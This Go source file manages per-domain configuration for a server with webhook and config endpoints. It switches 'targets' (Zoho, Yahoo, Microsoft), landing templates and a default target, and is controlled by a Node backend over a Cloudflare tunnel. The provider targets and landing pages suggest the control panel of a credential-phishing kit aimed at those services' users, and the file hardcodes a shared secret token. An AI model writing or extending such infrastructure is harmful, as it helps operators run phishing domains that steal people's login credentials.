package main

import (
	"encoding/json"
	"log"
	"net/http"
	"sync"
)

// ── CONFIGURATION STRUCTURES ──
type DomainState struct {
	Targets         map[string]bool `json:"targets"`
	LandingTemplate string          `json:"landing_template"`
	DefaultTarget   string          `json:"default_target"`
	Enabled         bool            `json:"enabled"`
}

type GlobalConfig struct {
	Domains map[string]*DomainState `json:"domains"`
}

// ── THREAD-SAFE CONFIG MANAGER ──
var (
	activeConfig *GlobalConfig
	configMu     sync.RWMutex

	// This MUST match the PRISM_ROUTING_WEBHOOK_SECRET in your Node.js .env file.
	adminToken = "a244a0c0f0210be8325ad0710df42872216a3acc460832a85086452792bc710c"
)

// initConfig initializes only the in-memory compatibility state. Persistent
// domain/landing/content configuration is loaded from the Mongo-backed runtime
// feed by initRuntimeConfigReader().
func initConfig() {
	configMu.Lock()
	activeConfig = &GlobalConfig{Domains: make(map[string]*DomainState)}
	configMu.Unlock()
	log.Printf("[⚙️] In-memory config initialized; Mongo runtime feed is authoritative.")
}

// saveConfigUnsafe is retained for compatibility with the legacy webhook path.
// Runtime configuration is no longer persisted to config.json.
func saveConfigUnsafe() {}

// IsTargetEnabled checks if a specific target is enabled for a given base domain.
func IsTargetEnabled(baseDomain, targetKey string) bool {
	configMu.RLock()
	defer configMu.RUnlock()

	if activeConfig == nil {
		return true // Fail open if config isn't loaded
	}

	state, exists := activeConfig.Domains[baseDomain]
	if !exists {
		return true // If domain isn't in config, default to ENABLED
	}

	enabled, targetExists := state.Targets[targetKey]
	if !targetExists {
		return true // If target isn't listed, default to ENABLED
	}

	return enabled
}

// ── API HANDLERS ──

func handleGetConfig(w http.ResponseWriter, r *http.Request) {
	_, baseDomain, _ := resolveHost(r.Host)

	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Content-Type", "application/json")

	// Safe domain/landing state comes directly from the DB-backed runtime feed.
	runtimeState, runtimeOK := getRuntimeDomainConfig(baseDomain)

	configMu.RLock()
	defer configMu.RUnlock()

	enabledTargets := []string{}
	var state *DomainState

	if s, exists := activeConfig.Domains[baseDomain]; exists {
		state = s
		for target, isEnabled := range state.Targets {
			if isEnabled {
				enabledTargets = append(enabledTargets, target)
			}
		}
	} else {
		enabledTargets = []string{"zoho", "yahoo", "microsoft"}
	}

	landingTemplate := "portal"
	defaultTarget := "microsoft"
	isEnabled := true

	if state != nil {
		if state.LandingTemplate != "" {
			landingTemplate = state.LandingTemplate
		}
		if state.DefaultTarget != "" {
			defaultTarget = state.DefaultTarget
		}
		isEnabled = state.Enabled
	}

	if runtimeOK {
		isEnabled = runtimeState.Enabled
		if templateID := landingTemplateFromRuntime(runtimeState); templateID != "" {
			landingTemplate = templateID
		}
	}

	response := map[string]interface{}{
		"enabled_targets":  enabledTargets,
		"enabled":          isEnabled,
		"landing_template": landingTemplate,
		"default_target":   defaultTarget,
	}

	json.NewEncoder(w).Encode(response)
}

// handleGetAllDomains returns all configured domains to the Node backend.
// NO CORS: This is strictly server-to-server via the Cloudflare tunnel.
func handleGetAllDomains(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
		return
	}

	// Authenticate the Node backend
	authHeader := r.Header.Get("X-Webhook-Secret")
	if authHeader != adminToken {
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return
	}

	configMu.RLock()
	defer configMu.RUnlock()

	type DomainInfo struct {
		ID              string          `json:"id"`
		Hostname        string          `json:"hostname"`
		Enabled         bool            `json:"enabled"`
		LandingTemplate string          `json:"landing_template"`
		DefaultTarget   string          `json:"default_target"`
		Targets         map[string]bool `json:"targets"`
	}

	var domains []DomainInfo
	for hostname, state := range activeConfig.Domains {
		domains = append(domains, DomainInfo{
			ID:              hostname,
			Hostname:        hostname,
			Enabled:         state.Enabled,
			LandingTemplate: state.LandingTemplate,
			DefaultTarget:   state.DefaultTarget,
			Targets:         state.Targets,
		})
	}

	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusOK)
	json.NewEncoder(w).Encode(map[string]interface{}{
		"domains": domains,
	})
}

// handleWebhookUpdate is called by the Node backend to change the config.
// NO CORS PREFLIGHT: This is strictly server-to-server.
func handleWebhookUpdate(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
		return
	}

	// 1. Authenticate
	authHeader := r.Header.Get("X-Webhook-Secret")
	if authHeader != adminToken {
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return
	}

	// 2. Parse the payload
	var req struct {
		Domain          string `json:"domain"`
		Target          string `json:"target"`
		Enabled         bool   `json:"enabled"`
		LandingTemplate string `json:"landing_template"`
		DefaultTarget   string `json:"default_target"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		return
	}

	// 3. Update the in-memory compatibility state.
	configMu.Lock()
	if activeConfig.Domains == nil {
		activeConfig.Domains = make(map[string]*DomainState)
	}

	state := activeConfig.Domains[req.Domain]

	if state == nil {
		state = &DomainState{
			Targets:         make(map[string]bool),
			LandingTemplate: "portal",
			DefaultTarget:   "microsoft",
			Enabled:         true,
		}
		activeConfig.Domains[req.Domain] = state
	}

	if state.Targets == nil {
		state.Targets = make(map[string]bool)
	}

	if req.Target != "" {
		state.Targets[req.Target] = req.Enabled
	} else {
		state.Enabled = req.Enabled
	}

	if req.LandingTemplate != "" {
		state.LandingTemplate = req.LandingTemplate
	}

	if req.DefaultTarget != "" {
		state.DefaultTarget = req.DefaultTarget
	}

	saveConfigUnsafe()
	configMu.Unlock()

	log.Printf("[⚙️] WEBHOOK UPDATE: %s -> Template: %s, Target: %s, DomainEnabled: %v",
		req.Domain, state.LandingTemplate, req.Target, state.Enabled)

	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusOK)
	w.Write([]byte(`{"status":"success"}`))
}
